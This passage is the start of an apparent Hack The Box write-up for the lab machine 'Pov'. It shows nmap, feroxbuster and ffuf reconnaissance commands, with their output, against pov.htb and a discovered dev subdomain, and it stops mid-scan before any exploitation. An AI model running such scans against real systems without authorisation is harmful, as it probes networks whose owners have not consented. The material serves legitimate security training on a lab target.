---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Pov

add `pov.htb` to `/etc/hosts`

## Nmap

`sudo nmap -sS -v -n -T4 -A pov.htb`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP (80)

It is some corporate landing website. Let's check what is there.

### Feroxbuster

`feroxbuster --smart -u http://pov.htb` <details> <summary>Result</summary>

```
     ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 邏                 ver: 2.10.1
───────────────────────────┬──────────────────────
   Target Url            │ http://pov.htb
   Threads               │ 50
   Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
   Status Codes          │ All Status Codes!
   Timeout (secs)        │ 7
 說  User-Agent            │ feroxbuster/2.10.1
   Config File           │ /etc/feroxbuster/ferox-config.toml
   Extract Links         │ true
   Collect Backups       │ true
 螺  Collect Words         │ true
   HTTP methods          │ [GET]
   Auto Tune             │ true
   Recursion Depth       │ 4
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      141c http://pov.htb/js => http://pov.htb/js/
301      GET        2l       10w      142c http://pov.htb/css => http://pov.htb/css/
301      GET        2l       10w      142c http://pov.htb/img => http://pov.htb/img/
200      GET        2l      284w    14244c http://pov.htb/js/aos.js
200      GET        4l       10w      382c http://pov.htb/img/favicon.png
200      GET       22l      132w    13356c http://pov.htb/img/smart-protect-1.jpg
200      GET        8l       34w     2034c http://pov.htb/img/client-3.png
200      GET        6l       20w     1480c http://pov.htb/img/client-2.png
200      GET       13l       55w     5918c http://pov.htb/img/logo.png
200      GET        3l       15w     1063c http://pov.htb/img/client-4.png
200      GET        3l       20w     1898c http://pov.htb/img/client-6.png
200      GET       23l      207w    11858c http://pov.htb/img/smart-protect-3.jpg
200      GET      162l      286w     2399c http://pov.htb/css/custom.css
200      GET       19l      133w    11607c http://pov.htb/img/smart-protect-2.jpg
200      GET       14l       43w     2390c http://pov.htb/img/client-1.png
200      GET        5l       26w     1732c http://pov.htb/img/client-5.png
200      GET        2l      220w    25983c http://pov.htb/css/aos.css
200      GET        4l       66w    31000c http://pov.htb/font-awesome-4.7.0/css/font-awesome.min.css
200      GET      339l     1666w   139445c http://pov.htb/img/feature-1.png
200      GET      325l     1886w   151416c http://pov.htb/img/feature-2.png
200      GET        6l     1643w   150996c http://pov.htb/css/bootstrap.min.css
200      GET      234l      834w    12330c http://pov.htb/
301      GET        2l       10w      161c http://pov.htb/font-awesome-4.7.0/css => http://pov.htb/font-awesome-4.7.0/css/
403      GET       29l       92w     1233c http://pov.htb/font-awesome-4.7.0/css/
301      GET        2l       10w      142c http://pov.htb/CSS => http://pov.htb/CSS/
301      GET        2l       10w      141c http://pov.htb/JS => http://pov.htb/JS/
301      GET        2l       10w      141c http://pov.htb/Js => http://pov.htb/Js/
301      GET        2l       10w      142c http://pov.htb/Css => http://pov.htb/Css/
301      GET        2l       10w      142c http://pov.htb/IMG => http://pov.htb/IMG/
301      GET        2l       10w      142c http://pov.htb/Img => http://pov.htb/Img/
403      GET       29l       92w     1233c http://pov.htb/font-awesome-4.7.0/
404      GET       40l      156w     1888c http://pov.htb/con
404      GET       40l      156w     1888c http://pov.htb/aux
400      GET        6l       26w      324c http://pov.htb/error%1F_log
400      GET        6l       26w      324c http://pov.htb/error%1F_log~
400      GET        6l       26w      324c http://pov.htb/error%1F_log.bak
400      GET        6l       26w      324c http://pov.htb/error%1F_log.bak2
400      GET        6l       26w      324c http://pov.htb/error%1F_log.old
400      GET        6l       26w      324c http://pov.htb/error%1F_log.1
400      GET        6l       26w      324c http://pov.htb/.error%1F_log.swp
404      GET       40l      156w     1888c http://pov.htb/prn
404      GET        0l        0w     1245c http://pov.htb/js/temp
404      GET        0l        0w     1245c http://pov.htb/js/files
404      GET        0l        0w     1245c http://pov.htb/js/aspnet_client
404      GET        0l        0w     1245c http://pov.htb/js/inc
404      GET        0l        0w     1245c http://pov.htb/js/lib
404      GET        0l        0w     1245c http://pov.htb/js/comments
404      GET        0l        0w     1245c http://pov.htb/js/data
404      GET        0l        0w     1245c http://pov.htb/js/editor
404      GET        0l        0w     1245c http://pov.htb/js/page
404      GET        0l        0w     1245c http://pov.htb/js/_private
404      GET        0l        0w     1245c http://pov.htb/js/catalog
404      GET        0l        0w     1245c http://pov.htb/js/docs
404      GET        0l        0w     1245c http://pov.htb/js/help
[####################] - 8m    482929/482929  0s      found:54      errors:634
[####################] - 27s    30152/30152   1106/s  http://pov.htb/
[####################] - 27s    30152/30152   1106/s  http://pov.htb/
[####################] - 6m     30162/30162   88/s    http://pov.htb/js/
[####################] - 7m     30162/30162   71/s    http://pov.htb/css/
[####################] - 7m     30162/30162   74/s    http://pov.htb/img/
[####################] - 4m     30162/30162   120/s   http://pov.htb/font-awesome-4.7.0/
[####################] - 8m     30162/30162   64/s    http://pov.htb/font-awesome-4.7.0/css/
[####################] - 6m     30162/30162   89/s    http://pov.htb/CSS/
[####################] - 8m     30162/30162   66/s    http://pov.htb/JS/
[####################] - 6m     30162/30162   82/s    http://pov.htb/Js/
[####################] - 6m     30162/30162   82/s    http://pov.htb/Css/
[####################] - 6m     30162/30162   79/s    http://pov.htb/IMG/
[####################] - 6m     30162/30162   83/s    http://pov.htb/Img/
[####################] - 5m     30162/30162   97/s    http://pov.htb/font-awesome-4.7.0/fonts/
[####################] - 4m     30162/30162   114/s   http://pov.htb/font-awesome-4.7.0/CSS/
[####################] - 3m     30162/30162   198/s   http://pov.htb/font-awesome-4.7.0/Css/
[####################] - 2m     30162/30162   295/s   http://pov.htb/font-awesome-4.7.0/Fonts/
```

</details> Nothing really..

How about subdomains?

### Subdomains

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pov.htb" -u http://pov.htb -fs 12330
```

finds `dev` subdomain. Nice, take a look there.

## HTTP (80): dev.pov.htb

Ok, this is something else. It looks like profile page for the developer. Let's snoop some mode

### Feroxbuster

`feroxbuster --smart -u http://dev.pov.htb`

<details> <summary>Result</summary>

```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.10.3
───────────────────────────┬──────────────────────
     Target Url            │ http://dev.pov.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.10.3
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     Collect Backups       │ true
     Collect Words         │ true
     HTTP methods          │ [GET]
     Auto Tune             │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        2l       10w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       29l       95w     1245c http://dev.pov.htb/text/css
404      GET       29l       95w     1245c http://dev.pov.htb/text/css~
404      GET       29l       95w     1245c http://dev.pov.htb/text/css.bak
404      GET       29l       95w     1245c http://dev.pov.htb/text/css.bak2
404      GET       29l       95w     1245c http://dev.pov.htb/text/css.old
404      GET       29l       95w     1245c http://dev.pov.htb/text/css.1
404      GET       29l       95w     1245c http://dev.pov.htb/text/.css.swp
404      GET       29l       95w     1245c http://dev.pov.htb/text/
404      GET       29l       95w     1245c http://dev.pov.htb/bin
404      GET       29l       95w     1245c http://dev.pov.htb/App_Code
404      GET       29l       95w     1245c http://dev.pov.htb/App_Data
404      GET       29l       95w     1245c http://dev.pov.htb/Bin
404      GET       29l       95w     1245c http://dev.pov.htb/App_Browsers
404      GET       29l       95w     1245c http://dev.pov.htb/app_code
404      GET       29l       95w     1245c http://dev.pov.htb/app_data
404      GET       29l       95w     1245c http://dev.pov.htb/app_browsers
404      GET       29l       95w     1245c http://dev.pov.htb/App_code
404      GET       29l       95w     1245c http://dev.pov.htb/portfolio/Style%20Library
404      GET       29l       95w     1245c http://dev.pov.htb/portfolio/Style%20Library~
404      GET       29l       95w     1245c http://dev.pov.htb/portfolio/Style%20Library.bak
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        2l       11w      165c http://dev.pov.htb/Style%20Library => http://dev.pov.htb/portfolio/Style Library
302      GET        2l       11w      166c http://dev.pov.htb/Style%20Library~ => http://dev.pov.htb/portfolio/Style Library~
302      GET        2l       11w      170c http://dev.pov.htb/Style%20Library.bak2 => http://dev.pov.htb/portfolio/Style Library.bak2
302      GET        2l       11w      169c http://dev.pov.htb/Style%20Library.old => http://dev.pov.htb/portfolio/Style Library.old
302      GET        2l       11w      167c http://dev.pov.htb/Style%20Library.1 => http://dev.pov.htb/portfolio/Style Library.1
302      GET        2l       11w      170c http://dev.pov.htb/.Style%20Library.swp => http://dev.pov.htb/portfolio/.Style Library.swp
200      GET       32l       73w      782c http://dev.pov.htb/portfolio/assets/js/steller.js
200      GET       38l      258w    20768c http://dev.pov.htb/portfolio/assets/imgs/folio-3.jpg
200      GET       99l      213w     4446c http://dev.pov.htb/portfolio/assets/imgs/logo.svg
200      GET      126l      692w    55960c http://dev.pov.htb/portfolio/assets/imgs/blog-3.jpg
200      GET      106l      271w     4691c http://dev.pov.htb/portfolio/contact.aspx
200      GET      105l      502w    40401c http://dev.pov.htb/portfolio/assets/imgs/avatar-1.jpg
200      GET       52l      394w    33816c http://dev.pov.htb/portfolio/assets/imgs/folio-6.jpg
200      GET      144l      883w    55365c http://dev.pov.htb/portfolio/assets/imgs/folio-2.jpg
200      GET       67l      370w    29350c http://dev.pov.htb/portfolio/assets/imgs/avatar-3.jpg
200      GET      322l     1567w   132049c http://dev.pov.htb/portfolio/assets/imgs/folio-4.jpg
200      GET     1081l     1807w    16450c http://dev.pov.htb/portfolio/assets/vendors/themify-icons/css/themify-icons.css
200      GET      245l     1128w    80751c http://dev.pov.htb/portfolio/assets/imgs/blog-1.jpg
200      GET      194l     1029w    81277c http://dev.pov.htb/portfolio/assets/imgs/folio-5.jpg
200      GET     1052l     2573w    48394c http://dev.pov.htb/portfolio/assets/imgs/man.svg
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/assets/js => http://dev.pov.htb/portfolio/assets/js/
200      GET       86l      557w    46195c http://dev.pov.htb/portfolio/assets/imgs/avatar-2.jpg
200      GET      150l      895w    76321c http://dev.pov.htb/portfolio/assets/imgs/folio-1.jpg
200      GET      123l      822w    67260c http://dev.pov.htb/portfolio/assets/imgs/blog-2.jpg
200      GET     7013l    22369w   222911c http://dev.pov.htb/portfolio/assets/vendors/bootstrap/bootstrap.bundle.js
200      GET    11646l    23442w   242029c http://dev.pov.htb/portfolio/assets/css/steller.css
200      GET      118l      695w    61432c http://dev.pov.htb/portfolio/assets/imgs/avatar.jpg
200      GET      162l      483w     4838c http://dev.pov.htb/portfolio/assets/vendors/bootstrap/bootstrap.affix.js
301      GET        2l       10w      164c http://dev.pov.htb/portfolio/assets/imgs => http://dev.pov.htb/portfolio/assets/imgs/
200      GET    10598l    42768w   280364c http://dev.pov.htb/portfolio/assets/vendors/jquery/jquery-3.4.1.js
200      GET      423l     1217w    21359c http://dev.pov.htb/portfolio/
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/assets/JS => http://dev.pov.htb/portfolio/assets/JS/
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/Assets/js => http://dev.pov.htb/portfolio/Assets/js/
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/assets/Js => http://dev.pov.htb/portfolio/assets/Js/
301      GET        2l       10w      164c http://dev.pov.htb/portfolio/Assets/imgs => http://dev.pov.htb/portfolio/Assets/imgs/
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/Assets/JS => http://dev.pov.htb/portfolio/Assets/JS/
301      GET        2l       10w      162c http://dev.pov.htb/portfolio/Assets/Js => http://dev.pov.htb/portfolio/Assets/Js/
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/jquery => http://dev.pov.htb/portfolio/assets/vendors/jquery/
302      GET        3l        8w      149c http://dev.pov.htb/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/vendors/jquery => http://dev.pov.htb/portfolio/Assets/vendors/jquery/
200      GET      423l     1217w    21371c http://dev.pov.htb/portfolio/default.aspx
302      GET        3l        8w      159c http://dev.pov.htb/portfolio/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/jQuery => http://dev.pov.htb/portfolio/assets/vendors/jQuery/
302      GET        3l        8w      175c http://dev.pov.htb/portfolio/assets/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/default.aspx
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/assets/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/assets/css/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/css/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/con
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/assets/js/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/js/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/assets/CSS/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/CSS/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/CSS/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/CSS/con
302      GET        3l        8w      180c http://dev.pov.htb/portfolio/assets/imgs/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/imgs/default.aspx
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/imgs/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/imgs/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/vendors/jQuery => http://dev.pov.htb/portfolio/Assets/vendors/jQuery/
302      GET        3l        8w      175c http://dev.pov.htb/portfolio/Assets/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/default.aspx
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/Assets/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/Assets/css/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/css/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/css/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/css/con
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/Assets/js/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/js/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/js/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/js/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/assets/Css/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Css/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/Css/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Css/con
302      GET        3l        8w      149c http://dev.pov.htb/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/aux
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/assets/Js/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Js/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/Js/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Js/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/Assets/CSS/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/CSS/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/CSS/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/CSS/con
302      GET        3l        8w      180c http://dev.pov.htb/portfolio/Assets/imgs/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/imgs/default.aspx
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/imgs/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/imgs/con
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/Assets/JS/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/JS/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/JS/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/JS/con
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/JS/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/JS/con
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/assets/vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/vendors/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/con
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/Css/authentication
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/js/110
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/Css/avia
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/js/112
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/Assets/Js/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Js/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/Js/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Js/con
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/Assets/Css/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Css/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/Css/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Css/con
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/Assets/vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/vendors/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/vendors/con
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/css/images6
301      GET        2l       10w      164c http://dev.pov.htb/portfolio/assets/Imgs => http://dev.pov.htb/portfolio/assets/Imgs/
302      GET        3l        8w      159c http://dev.pov.htb/portfolio/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/aux
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/assets/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/aux
302      GET        2l       11w      163c http://dev.pov.htb/Donate%20Cash => http://dev.pov.htb/portfolio/Donate Cash
302      GET        2l       11w      164c http://dev.pov.htb/Donate%20Cash~ => http://dev.pov.htb/portfolio/Donate Cash~
302      GET        2l       11w      167c http://dev.pov.htb/Donate%20Cash.bak => http://dev.pov.htb/portfolio/Donate Cash.bak
302      GET        2l       11w      167c http://dev.pov.htb/Donate%20Cash.old => http://dev.pov.htb/portfolio/Donate Cash.old
302      GET        2l       11w      165c http://dev.pov.htb/Donate%20Cash.1 => http://dev.pov.htb/portfolio/Donate Cash.1
302      GET        2l       11w      168c http://dev.pov.htb/.Donate%20Cash.swp => http://dev.pov.htb/portfolio/.Donate Cash.swp
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/css/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/aux
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/js/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/aux
301      GET        2l       10w      164c http://dev.pov.htb/portfolio/Assets/Imgs => http://dev.pov.htb/portfolio/Assets/Imgs/
302      GET        2l       11w      160c http://dev.pov.htb/Site%20Map => http://dev.pov.htb/portfolio/Site Map
302      GET        2l       11w      161c http://dev.pov.htb/Site%20Map~ => http://dev.pov.htb/portfolio/Site Map~
302      GET        2l       11w      164c http://dev.pov.htb/Site%20Map.bak => http://dev.pov.htb/portfolio/Site Map.bak
302      GET        2l       11w      164c http://dev.pov.htb/Site%20Map.old => http://dev.pov.htb/portfolio/Site Map.old
302      GET        2l       11w      162c http://dev.pov.htb/Site%20Map.1 => http://dev.pov.htb/portfolio/Site Map.1
302      GET        2l       11w      165c http://dev.pov.htb/.Site%20Map.swp => http://dev.pov.htb/portfolio/.Site Map.swp
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/imgs/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/imgs/aux
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/CSS/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/CSS/aux
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/Assets/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/aux
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/css/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/css/aux
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/JS/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/JS/aux
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/js/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/js/aux
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/Js/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Js/aux
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/CSS/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/CSS/aux
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/Css/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Css/aux
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/JS/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/JS/aux
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/JQuery => http://dev.pov.htb/portfolio/assets/vendors/JQuery/
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/imgs/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/imgs/aux
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/vendors/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/aux
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/videogallery
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/vendors/CartPage
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/Imgs/term
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/vendors/DOCUMENTS
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/Js/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Js/aux
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/Css/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Css/aux
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/vendors/JQuery => http://dev.pov.htb/portfolio/Assets/vendors/JQuery/
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/imgs/reset-password
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/vendors/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/vendors/aux
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/Vendors/jquery => http://dev.pov.htb/portfolio/assets/Vendors/jquery/
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/Vendors/jquery => http://dev.pov.htb/portfolio/Assets/Vendors/jquery/
302      GET        2l       11w      164c http://dev.pov.htb/Bequest%20Gift => http://dev.pov.htb/portfolio/Bequest Gift
302      GET        2l       11w      165c http://dev.pov.htb/Bequest%20Gift~ => http://dev.pov.htb/portfolio/Bequest Gift~
302      GET        2l       11w      169c http://dev.pov.htb/Bequest%20Gift.bak2 => http://dev.pov.htb/portfolio/Bequest Gift.bak2
302      GET        2l       11w      168c http://dev.pov.htb/Bequest%20Gift.old => http://dev.pov.htb/portfolio/Bequest Gift.old
302      GET        2l       11w      162c http://dev.pov.htb/New%20Folder => http://dev.pov.htb/portfolio/New Folder
302      GET        2l       11w      163c http://dev.pov.htb/New%20Folder~ => http://dev.pov.htb/portfolio/New Folder~
302      GET        2l       11w      166c http://dev.pov.htb/New%20Folder.bak => http://dev.pov.htb/portfolio/New Folder.bak
302      GET        2l       11w      166c http://dev.pov.htb/New%20Folder.old => http://dev.pov.htb/portfolio/New Folder.old
302      GET        2l       11w      167c http://dev.pov.htb/.New%20Folder.swp => http://dev.pov.htb/portfolio/.New Folder.swp
302      GET        2l       11w      163c http://dev.pov.htb/Site%20Assets => http://dev.pov.htb/portfolio/Site Assets
302      GET        2l       11w      164c http://dev.pov.htb/Site%20Assets~ => http://dev.pov.htb/portfolio/Site Assets~
302      GET        2l       11w      167c http://dev.pov.htb/Site%20Assets.bak => http://dev.pov.htb/portfolio/Site Assets.bak
302      GET        2l       11w      168c http://dev.pov.htb/Site%20Assets.bak2 => http://dev.pov.htb/portfolio/Site Assets.bak2
302      GET        2l       11w      167c http://dev.pov.htb/Site%20Assets.old => http://dev.pov.htb/portfolio/Site Assets.old
302      GET        2l       11w      165c http://dev.pov.htb/Site%20Assets.1 => http://dev.pov.htb/portfolio/Site Assets.1
302      GET        2l       11w      168c http://dev.pov.htb/.Site%20Assets.swp => http://dev.pov.htb/portfolio/.Site Assets.swp
302      GET        3l        8w      180c http://dev.pov.htb/portfolio/assets/Imgs/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/default.aspx
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/Imgs/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/Vendors/jQuery => http://dev.pov.htb/portfolio/assets/Vendors/jQuery/
302      GET        3l        8w      180c http://dev.pov.htb/portfolio/Assets/Imgs/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Imgs/default.aspx
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/Imgs/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Imgs/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/Vendors/jQuery => http://dev.pov.htb/portfolio/Assets/Vendors/jQuery/
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/.error%1F_log.swp
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/assets/Vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/Vendors/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/con
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/Assets/Vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/Vendors/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Vendors/con
302      GET        3l        8w      149c http://dev.pov.htb/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/prn
